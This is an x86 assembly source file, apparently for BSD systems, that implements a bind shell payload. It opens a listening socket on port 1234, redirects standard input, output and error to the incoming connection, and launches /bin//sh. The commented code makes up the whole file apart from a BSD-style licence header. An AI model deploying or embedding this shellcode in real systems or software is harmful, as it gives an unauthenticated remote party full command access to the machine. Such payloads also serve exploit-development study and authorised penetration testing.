;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    
    bits   32
    
    xor    eax, eax
    mov    edx, ~0xD2040200 & 0xFFFFFFFF
    not    edx
    push   eax          ; sa.sin_addr = ADDR_ANY
    push   edx          ; sa.sin_port = 1234, sa.sin_family=AF_INET
    mov    edi, esp     ; edi = &sa
    
    ; step 1
    ; socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
    push   97
    pop    eax
    cdq
    push   edx          ; IPPROTO_IP
    push   1            ; SOCK_STREAM
    push   2            ; AF_INET
    push   16           ; sizeof(sa)
    int    0x80

    xchg   eax, ebx
    ; step 2
    ; bind (s, &sa, sizeof(sa));
    push   edi          ; &sa
    push   ebx          ; s
    push   edx          ; 0 
    push   104
    pop    eax          ; kernel expects call
    int    0x80
    
    ; step 3, listen for incoming connections
    ; listen (s, 0);
    push   ebx          ; s
    push   edx          ; 0
    push   106          ; eax=sys_listen
    pop    eax     
    int    0x80
    
    ; step 4, accept connections
    ; accept (s, 0, 0);
    push   edx          ; 0
    push   ebx          ; s
    push   2            ; 2
    push   30           ; eax = sys_accept
    pop    eax    
    int    0x80
    
    ; step 5, assign socket to stdin, stdout and stderr
    ; dup2 (r, STDIN_FILENO)
    ; dup2 (r, STDOUT_FILENO)
    ; dup2 (r, STDERR_FILENO)
    push   eax          ; r
    push   edx          ; 0
dup_loop:
    push   90           ; eax=sys_dup2
    pop    eax
    int    0x80
    dec    dword[esp+8]
    jns    dup_loop
    
    ; step 6
    ; execve ("/bin//sh", {"/bin//sh", NULL}, 0);
    push    edx         ; '\0'
    push    '//sh'
    push    '/bin'
    mov     ebx, esp    ; ebx = "/bin//sh", 0
    push    edx         ; NULL
    push    ebx         ; "/bin//sh", 0
    mov     ecx, esp
    push    edx
    push    ecx
    push    ebx         ; "/bin//sh", 0
    push    edx         
    mov     al, 0x3b    ; eax = sys_execve
    int     0x80
    